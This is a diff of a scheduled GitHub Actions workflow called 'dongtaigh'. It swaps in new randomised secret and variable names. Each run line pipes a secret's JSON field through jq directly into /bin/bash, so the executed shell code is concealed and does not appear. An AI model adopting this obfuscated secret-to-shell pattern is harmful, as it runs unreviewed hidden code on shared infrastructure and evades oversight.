@@ -1,21 +1,27 @@
 name: dongtaigh
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 4/6 * * *'
-jobs:  # 28386
+    - cron: '23 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongtaigh
         env:
-          t3262: ${{ secrets.t3262 }}
+          thdu13: ${{ secrets.thdu13 }}
         run: |
-          echo $t3262 | jq -r .y4 | /bin/bash
-          echo $vlbs98876 | jq -r .zfyg40 | /bin/bash
-          echo $i066 | jq -r .gssw1351 | /bin/bash
-          echo $fzbsm322 | jq -r .mnffr86 | /bin/bash
-          echo $ilkty9 | jq -r .gqk76855 | /bin/bash
+          echo $thdu13 | jq -r .ygnuy27 | /bin/bash
+          echo $w65 | jq -r .weqku82595 | /bin/bash
+          echo $fhu4 | jq -r .afr0855 | /bin/bash
+          echo $f6772 | jq -r .jyn1965 | /bin/bash
+          echo $vo7908 | jq -r .iij2772 | /bin/bash
+          echo $kh9 | jq -r .etpu95 | /bin/bash
+          echo $viu6 | jq -r .qvlic905 | /bin/bash
+          echo $yd2954 | jq -r .b7270 | /bin/bash
+          echo $pivv68426 | jq -r .gfaww09 | /bin/bash
+          echo $gpn506 | jq -r .ig89 | /bin/bash
 
